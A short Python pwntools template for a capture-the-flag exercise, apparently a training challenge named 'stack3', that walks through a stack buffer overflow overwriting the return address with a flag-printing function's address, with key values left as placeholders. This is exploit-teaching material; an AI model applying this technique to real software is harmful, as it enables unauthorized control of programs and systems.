#!/usr/bin/env python3
from pwn import *

# You need to fill this in:
GIVE_FLAG_ADDR = ??

# Remote = connect to remote server
# Process = run locally
# Uncomment the line of whichever one you want to use!
#conn = remote('chal.sigpwny.com', 1354)
#conn = process('./stack3')

# Step 1: Overflow the stack!
# You need to fill in the number of bytes to overflow here
buf = b'A' * ??

# Step 2: Overwrite the return address!
buf += p32(GIVE_FLAG_ADDR)

# Step 3: Send the exploit!
conn.sendline(buf)

# If it worked, we should receive a flag!
# Never forget to go interactive after sending your exploit!
conn.interactive()
